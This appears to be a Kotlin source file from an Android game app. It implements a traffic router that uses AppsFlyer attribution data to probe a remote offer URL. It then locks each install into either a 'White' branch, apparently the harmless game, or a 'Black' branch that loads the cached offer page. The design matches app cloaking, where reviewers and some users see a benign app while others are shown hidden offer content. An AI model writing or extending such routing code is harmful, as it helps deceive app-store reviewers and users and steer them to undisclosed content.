package com.oroclub.game.integration

import android.os.Handler
import android.os.Looper
import android.util.Log
import com.oroclub.game.BuildConfig
import java.util.concurrent.Executors

object TrafficRouter {

    private const val TAG = "TrafficRouter"

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun buildOfferUrl(): String = OfferUrlBuilder.build(
        baseUrl = BuildConfig.OFFER_BASE_URL,
        // The whole map. Hand-picking campaign/af_status/media_source here is the classic
        // regression: it compiles, it runs, and the network quietly loses parameters.
        appsFlyerParams = IntegrationStorage.attributionParams,
        appsFlyerId = IntegrationStorage.appsFlyerId
    )

    fun route(probe: OfferProbe = HttpOfferProbe(), onResult: (RouteDecision) -> Unit) {
        // A pinned branch is answered without touching the network, so relaunches are
        // instant and cannot flip the user between sides.
        if (IntegrationStorage.whiteLocked) {
            deliver(RouteDecision.White, onResult)
            return
        }
        val cached = IntegrationStorage.cachedOfferUrl
        if (!cached.isNullOrBlank()) {
            deliver(RouteDecision.Black(cached), onResult)
            return
        }
        if (BuildConfig.OFFER_BASE_URL.isBlank()) {
            // Nothing to probe. Show White, but pin nothing - a later build with a real
            // URL must still get its chance.
            deliver(RouteDecision.White, onResult)
            return
        }

        executor.execute {
            val url = buildOfferUrl()
            val decision = runCatching { RoutingRules.decide(probe.probe(url), url) }
                .onFailure { Log.w(TAG, "Offer probe failed for $url", it) }
                .getOrNull()

            when (decision) {
                is RouteDecision.Black -> IntegrationStorage.cachedOfferUrl = decision.url
                RouteDecision.White -> IntegrationStorage.whiteLocked = true
                // Network or TLS error: not an answer about this install. Fall back to
                // White for this launch and pin nothing so the next one asks again.
                null -> Unit
            }

            deliver(decision ?: RouteDecision.White, onResult)
        }
    }

    private fun deliver(decision: RouteDecision, onResult: (RouteDecision) -> Unit) {
        mainHandler.post { onResult(decision) }
    }
}
